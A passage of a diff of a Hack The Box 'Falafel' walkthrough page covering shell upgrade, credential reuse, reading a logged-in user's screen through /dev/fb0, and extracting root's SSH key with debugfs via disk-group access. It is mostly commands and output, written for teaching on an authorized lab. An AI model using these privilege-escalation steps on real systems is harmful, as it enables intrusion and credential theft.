+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 </code></pre>
 <p>This gives us a pseudo-terminal, making the shell behave more like a real SSH session.</p>
 <h3 id="step-7c-become-moshe">Step 7C: Become Moshe</h3>
-<pre><code class="language-bash" data-language="bash">su moshe
+<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">su moshe
 </code></pre>
 <p>Password: <code>REDACTED</code></p>
 <p><strong>Result:</strong></p>
-<pre><code>moshe@falafel:/var/www/html/uploads/0531-1954_30d7e3e4cc82c58e$ id
+<pre tabindex="0" aria-label="Code or terminal block 27"><code>moshe@falafel:/var/www/html/uploads/0531-1954_30d7e3e4cc82c58e$ id
 uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
 </code></pre>
 <h3 id="step-7d-get-the-user-flag">Step 7D: Get the User Flag</h3>
-<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">cat ~/user.txt
 </code></pre>
 <p><strong>Flag:</strong> <code>1e90960[redacted]5bf217a</code></p>
 <p><strong>Check your groups immediately.</strong> <code>groups</code> tells you what resources you can access. Look at that list - <code>video</code>, <code>audio</code>, <code>floppy</code>, <code>games</code>, <code>adm</code>... these are not random. On a CTF box, unusual group memberships are <strong></strong> part of the intended path.</p>
 <hr>
 <h2 id="phase-8-privilege-escalation-to-yossi-the-framebuffer">Phase 8: Privilege Escalation to Yossi - The Framebuffer</h2>
 <h3 id="step-8a-check-who-else-is-logged-in">Step 8A: Check Who Else is Logged In</h3>
-<pre><code class="language-bash" data-language="bash">w
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">w
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<pre tabindex="0" aria-label="Code or terminal block 30"><code>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1     -                Sat23   20:52m  0.04s  0.03s -bash
 </code></pre>
 <p><strong> <code>yossi</code> is physically logged in on <code>tty1</code>.</strong> This means there's a real monitor and keyboard attached (or a virtual console). If we can see the screen, we might see what yossi is doing - maybe typing a password.</p>
 <h3 id="step-8b-check-video-group-access">Step 8B: Check Video Group Access</h3>
-<pre><code class="language-bash" data-language="bash">groups
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">groups
 ls -l /dev/fb*
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>crw-rw---- 1 root video 29, 0 May 1 19:42 /dev/fb0
+<pre tabindex="0" aria-label="Code or terminal block 32"><code>crw-rw---- 1 root video 29, 0 May 1 19:42 /dev/fb0
 </code></pre>
 <p><strong>What is <code>/dev/fb0</code>?</strong>
 The <strong>framebuffer</strong> is a memory-mapped device that represents the current contents of the screen. On Linux systems with a GUI or console, <code>/dev/fb0</code> contains the raw pixel data being displayed.</p>
 <p><strong>Why does <code>video</code> group matter?</strong>
 The framebuffer device is owned by <code>root</code> with group <code>video</code>. Since <code>moshe</code> is in the <code>video</code> group, we can read the screen.</p>
 <h3 id="step-8c-capture-the-screen">Step 8C: Capture the Screen</h3>
-<pre><code class="language-bash" data-language="bash">cat /dev/fb0 &gt; /tmp/screenshot.raw
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">cat /dev/fb0 &gt; /tmp/screenshot.raw
 </code></pre>
 <h3 id="step-8d-get-screen-resolution">Step 8D: Get Screen Resolution</h3>
-<pre><code class="language-bash" data-language="bash">cat /sys/class/graphics/fb0/virtual_size
+<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">cat /sys/class/graphics/fb0/virtual_size
 </code></pre>
 <p><strong>Result:</strong> <code>1176,885</code></p>
 <p><strong>Why do we need this?</strong>
@@ -391,7 +392,7 @@ The raw framebuffer is just a blob of bytes. To convert it to an image, we need 
 <li>Pixel format: we have to guess this (common formats: <code>rgb565</code>, <code>0rgb</code>, <code>bgr24</code>)</li>
 </ul>
 <h3 id="step-8e-transfer-to-kali-and-convert">Step 8E: Transfer to Kali and Convert</h3>
-<pre><code class="language-bash" data-language="bash"># On Kali
+<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash"># On Kali
 scp moshe@10.129.229.139:/tmp/screenshot.raw ./screenshot.raw
 
 # Convert with ffmpeg
@@ -400,40 +401,40 @@ xdg-open screenshot.jpg
 </code></pre>
 <p><strong>What we see in the image:</strong>
 Yossi is at a terminal. He typed his password by mistake into the username field of the <code>passwd</code> command:</p>
-<pre><code>yossi@falafel:~$ passwd
+<pre tabindex="0" aria-label="Code or terminal block 36"><code>yossi@falafel:~$ passwd
 Changing password for yossi.
 (current) UNIX password: REDACTED
 </code></pre>
 <p><strong>Password:</strong> <code>REDACTED</code></p>
 <p><strong>The framebuffer is an often-overlooked attack vector.</strong> If a user is physically logged in and you have <code>video</code> group access, you can literally <em>see their screen</em>. This is not theoretical - it's exactly what we just did. On shared systems, kiosks, or servers with physical consoles, this is a real threat.</p>
 <h3 id="step-8f-ssh-as-yossi">Step 8F: SSH as Yossi</h3>
-<pre><code class="language-bash" data-language="bash">ssh yossi@10.129.229.139
+<pre tabindex="0" aria-label="bash code or terminal block 37"><code class="language-bash" data-language="bash">ssh yossi@10.129.229.139
 </code></pre>
 <p>Password: <code>REDACTED</code></p>
 <hr>
 <h2 id="phase-9-privilege-escalation-to-root-the-disk-group">Phase 9: Privilege Escalation to Root - The Disk Group</h2>
 <h3 id="step-9a-check-yossi-s-groups">Step 9A: Check Yossi's Groups</h3>
-<pre><code class="language-bash" data-language="bash">groups
+<pre tabindex="0" aria-label="bash code or terminal block 38"><code class="language-bash" data-language="bash">groups
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>yossi adm disk cdrom dip plugdev lpadmin sambashare
+<pre tabindex="0" aria-label="Code or terminal block 39"><code>yossi adm disk cdrom dip plugdev lpadmin sambashare
 </code></pre>
 <p><strong> <code>disk</code> group is incredibly powerful.</strong> Members of the <code>disk</code> group can read and write directly to raw disk devices (<code>/dev/sda</code>, <code>/dev/sda1</code>, etc.). This means you can bypass the entire Linux permission system and read <em>any file on the disk</em>, including <code>/root/.ssh/id_rsa</code>, <code>/etc/shadow</code>, or anything else.</p>
 <p><strong>Why is this dangerous?</strong>
 The <code>disk</code> group is effectively root access because you can mount, read, and write the raw filesystem. The OS permission checks happen at the filesystem level, but if you're reading the raw device, you're bypassing those checks entirely.</p>
 <h3 id="step-9b-enumerate-disk-devices">Step 9B: Enumerate Disk Devices</h3>
-<pre><code class="language-bash" data-language="bash">df
+<pre tabindex="0" aria-label="bash code or terminal block 40"><code class="language-bash" data-language="bash">df
 blkid
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+<pre tabindex="0" aria-label="Code or terminal block 41"><code>/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
 </code></pre>
 <h3 id="step-9c-use-debugfs-to-access-root-s-files">Step 9C: Use debugfs to Access Root's Files</h3>
 <p><code>debugfs</code> is a filesystem debugger that can operate on unmounted or mounted ext filesystems. Since we can read <code>/dev/sda1</code> (thanks to <code>disk</code> group), we can use <code>debugfs</code> to browse the filesystem as if we were root.</p>
-<pre><code class="language-bash" data-language="bash">debugfs /dev/sda1
+<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">debugfs /dev/sda1
 </code></pre>
 <p><strong>Inside debugfs:</strong></p>
-<pre><code>debugfs: ls -l /root/.ssh
+<pre tabindex="0" aria-label="Code or terminal block 43"><code>debugfs: ls -l /root/.ssh
   56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .
    2456   40750 (2)      0      0    4096 30-May-2026 23:18 ..
   56619  100600 (1)      0      0    1679 28-Nov-2017 23:01 id_rsa
@@ -445,15 +446,15 @@ debugfs: quit
 </code></pre>
 <p> We just extracted root's private SSH key by reading the raw disk device. The Linux kernel never checked whether <code>yossi</code> had permission to read <code>/root/.ssh/id_rsa</code> because we went <em>around</em> the kernel's permission system entirely.</p>
 <h3 id="step-9d-ssh-as-root">Step 9D: SSH as Root</h3>
-<pre><code class="language-bash" data-language="bash">chmod 600 /tmp/id_rsa
+<pre tabindex="0" aria-label="bash code or terminal block 44"><code class="language-bash" data-language="bash">chmod 600 /tmp/id_rsa
 ssh -i /tmp/id_rsa root@localhost
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
+<pre tabindex="0" aria-label="Code or terminal block 45"><code>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
 root@falafel:~#
 </code></pre>
 <h3 id="step-9e-get-the-root-flag">Step 9E: Get the Root Flag</h3>
-<pre><code class="language-bash" data-language="bash">cat /root/root.txt
+<pre tabindex="0" aria-label="bash code or terminal block 46"><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
 <p><strong>Flag:</strong> <code>cc38a0[redacted]3341cd5</code></p>
 <hr>
@@ -479,9 +480,9 @@ root@falafel:~#
 <h3 id="7-documentation-is-professionalism">7. Documentation is Professionalism</h3>
 <p>Preserving Nmap output, commands, paths, and responses makes the work reproducible and supports accurate reporting.</p>
 <hr>
-<p><strong>Congratulations on rooting Falafel!</strong> </p>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
-b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-facts-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Facts Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:19:18.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-fighter-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Fighter Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:14:00.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-12:T562,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/#article","headline":"Hack The Box: Falafel Walkthrough","description":"PHP type juggling bypasses the admin login and filename truncation turns an upload into a web shell, followed by reused credentials, framebuffer capture and disk-group access to the root SSH key.","url":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/","datePublished":"2026-06-11T15:16:55.000Z","dateModified":"2026-06-11T15:16:55.000Z","wordCount":3029,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/1e33a051efd110570ea1dda27f465f991b082c9a/HTB-Falafel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-falafel-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Falafel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
-e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
-15:null
+<p><strong>Congratulations on rooting Falafel!</strong> </p>b:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L10",null,{"headings":[{"id":"phase-0-before-starting","label":"Phase 0: Before Starting"},{"id":"phase-1-reconnaissance-mapping-the-attack-surface","label":"Phase 1: Reconnaissance - Mapping the Attack Surface"},{"id":"phase-2-web-enumeration-reading-the-signs","label":"Phase 2: Web Enumeration - Reading the Signs"},{"id":"phase-3-authentication-recon-finding-the-cracks","label":"Phase 3: Authentication Recon - Finding the Cracks"},{"id":"phase-4-php-type-juggling-the-magic-hash-attack","label":"Phase 4: PHP Type Juggling - The Magic Hash Attack"},{"id":"phase-5-file-upload-exploitation-filename-truncation","label":"Phase 5: File Upload Exploitation - Filename Truncation"},{"id":"phase-6-initial-access-catching-a-shell","label":"Phase 6: Initial Access - Catching a Shell"},{"id":"phase-7-privilege-escalation-to-moshe-credential-reuse","label":"Phase 7: Privilege Escalation to Moshe - Credential Reuse"},{"id":"phase-8-privilege-escalation-to-yossi-the-framebuffer","label":"Phase 8: Privilege Escalation to Yossi - The Framebuffer"},{"id":"phase-9-privilege-escalation-to-root-the-disk-group","label":"Phase 9: Privilege Escalation to Root - The Disk Group"},{"id":"key-lessons-and-takeaways","label":"Key Lessons & Takeaways"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/1e33a051efd110570ea1dda27f465f991b082c9a/HTB-Falafel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 1e33a051efd1",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Falafel, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"10 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]]}]
+c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-facts-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Facts Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:19:18.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-fighter-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Fighter Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:14:00.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+13:T562,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/#article","headline":"Hack The Box: Falafel Walkthrough","description":"PHP type juggling bypasses the admin login and filename truncation turns an upload into a web shell, followed by reused credentials, framebuffer capture and disk-group access to the root SSH key.","url":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/","datePublished":"2026-06-11T15:16:55.000Z","dateModified":"2026-06-11T15:16:55.000Z","wordCount":3029,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/1e33a051efd110570ea1dda27f465f991b082c9a/HTB-Falafel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-falafel-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Falafel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
+f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
+16:null
